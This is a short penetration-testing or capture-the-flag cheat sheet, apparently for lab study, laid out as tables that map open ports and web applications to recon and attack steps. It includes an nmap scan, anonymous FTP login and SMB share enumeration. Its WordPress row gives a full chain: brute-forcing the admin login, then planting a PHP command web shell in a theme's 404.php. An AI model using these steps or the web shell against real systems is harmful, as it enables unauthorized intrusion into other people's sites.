
#### What ports are open?

| Condition | Action |
|---|---|
| Always start with | `nmap -sC -sV -oA scan $IP` ·|
| FTP open (21) | `ftp $IP` → login: `anonymous` look for notes, keys, images ·|
| HTTP open (80/8080) | Check robots.txt, page source, headers, fuzz dirs tools: `gobuster`, `dirb`, `feroxbuster` ·|
| SMB / unusual ports | `nmap -p 445 --script smb-enum-shares $IP` ·|

#### Web app found what's running?

| Condition | Action |
|---|---|
| WordPress | Bruteforce login, then RCE via theme editor|
              Bruteforce: wpbrute -u admin -w passwords.txt -target http://target/wp-login.php |
              RCE: Edit Appearance → Theme Editor → 404.php → add <?php system($_GET['cmd']) ?> |
              Access: /wp-content/themes/twentyseventeen/404.php?cmd=id |
| Known CMS / version | Search ExploitDB for version-specific RCE ·|
| Custom / unknown app | Read source & comments; fuzz params tools: `wfuzz`, `ffuf` ·|
| Default / broken page | View page source creds or hidden paths may be commented ·|
